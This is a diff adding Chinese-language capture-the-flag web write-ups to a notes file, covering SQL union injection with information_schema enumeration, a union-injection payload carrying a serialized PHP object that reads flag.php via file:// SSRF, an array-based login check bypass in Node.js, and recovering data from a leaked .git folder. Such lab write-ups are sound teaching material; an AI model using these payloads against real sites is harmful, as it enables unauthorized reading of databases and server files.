@@ -541,3 +541,147 @@ post中替换请求体为：
 ![](./img/加速加速竞争获取flag.png)
 
 ---
+
+## [网鼎杯 2018]Fakebook
+
+https://www.nssctf.cn/problem/20
+
+* 考点：sql注入
+
+
+
+
+sql注入考点：
+
+`order by ` 注入 获取数据库查询的列数
+
+联合查询注入
+```
+SELECT * FROM some_table WHERE no = 0
+UNION
+SELECT 1, GROUP_CONCAT(table_name), 3, 4
+FROM information_schema.tables
+WHERE table_schema = database();
+```
+该查询可以用来获得当前使用的数据库中的表都有哪些，`table_schema`表示当前查询的表所属的数据库的名称，`information_schema.tables`包含了数据库中的所有表的信息，`database()`会返回当前使用的数据库的名称，`GROUP_CONCAT(table_name)`会返回当前数据库中所有表的名称，以逗号分隔
+
+```
+SELECT * FROM some_table WHERE no = 0
+UNION
+SELECT 1, GROUP_CONCAT(column_name), 3, 4
+FROM information_schema.columns
+WHERE table_schema = database() AND table_name = 'users';
+```
+和前面的一样，在已经知道表名的基础上进一步查询该表中的列名
+
+```php
+function get($url)
+```
+一种SSRF攻击的例子，攻击者可以提交`url`来让服务器去访问其本身的内容（外部无权访问的内容）
+```
+file://
+```
+为协议可以用于访问文件的内容
+
+
+因此可以根据这些技巧去尝试，首先在各个页面来回点击和查看的过程中已经发现了`view.php?no=0`为可注入点，通过`sqlmap`扫描无果后决定采用盲注去获取更多的信息
+
+在进行联合查询的过程中，发现其列最多有 4 列，也就证明联合查询注入是可行的，由此，进一步构建 payload 得到当前所使用的数据库的表名和列名
+
+![](./img/fakebook_查询表名.png)
+
+![](./img/fakebook_查询列名.png)
+
+然后通过之前检查`robots.txt`的内容得到了一个 php 源码文件，通过代码审计发现是一个关于反序列化的题目，而且根据经验可以猜测 flag 就在网页的根目录下，于是最后构建了下面的 payload 进行最后的注入攻击的
+
+```
+view.php?no=1%20union/**/select%20%201,2,3,'O:8:"UserInfo":3:{s:4:"name";s:0:"";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
+```
+
+在进行攻击后查看网页的源码，发现已经回显了 flag 文件内容
+
+![](./img/fakebook_获得flag.png)
+
+解码得到 flag
+
+---
+
+## [西湖论剑 2022]Node Magical Login
+
+https://www.nssctf.cn/problem/3429
+
+* 考点：cookie,NodeJS,代码审计
+* 工具：yakit
+
+代码需要自行去下载
+
+[源码](https://github.com/CTF-Archives/2022-xhlj-web-node_magical_login)
+
+通过阅读源码可以知道，网站用户名只能为 admin，并且对于每一次的登录都会随机生成一个密码，所以直接通过注入无法登录成功，但在源码中，cookie认证已经泄露：
+
+![](./img/nodejs-重要cookie.png)
+
+再继续往下看，发现当 cookie 的值为其中的一个时便可以有权访问 flag1 和 flag2 ，得到其明文内容，于是可以以构建下面的数据包进行请求得到 flag
+
+![](/img/nodejs-获取flag.png)
+
+
+补充：数组比较可以绕过强制转小写操作，可将下面的内容作为 post 的请求体发送：
+```
+{
+				
+	     		"checkcode":["a",
+"G",
+"r",
+"5",
+"A",
+"t",
+"S",
+"p",
+"5",
+"5",
+"d",
+"R",
+"a",
+"c",
+"e",
+"r"
+]
+}
+
+```
+---
+## [NCTF 2018]全球最大交友网站
+
+https://www.nssctf.cn/problem/961
+
+* 考点：.git泄露 
+* 工具：git
+
+进入网页发现可以访问文件目录，下载 zip 解压后是一个 .git 文件夹，在终端中使用 git 命令可以查看其具体信息：
+
+![](./img/git泄露-1.png)
+
+```sh
+git log #查看提交历史
+git status #查看项目状态
+git restore README.md #恢复删除的文件
+git log -- README.md #查看文件历史
+git checkout tags/1.0 #检出 1.0 标签，查看文件状态。
+git diff tags/1.0 #查看当前状态与 1.0 标签之间的差异。
+git show tags/1.0 #查看与 1.0 标签关联的提交详细信息。
+```
+
+查看日志发现有几次提交记录，并且有一个被删除的文件
+
+![](/img/git泄露-2.png)
+
+恢复被删除的文件后查看其内容：
+
+![](./img/git泄露-2.5.png)
+
+根据提示查看1.0标签的具体变动：
+
+![](/img/git泄露-3.png)
+
+---
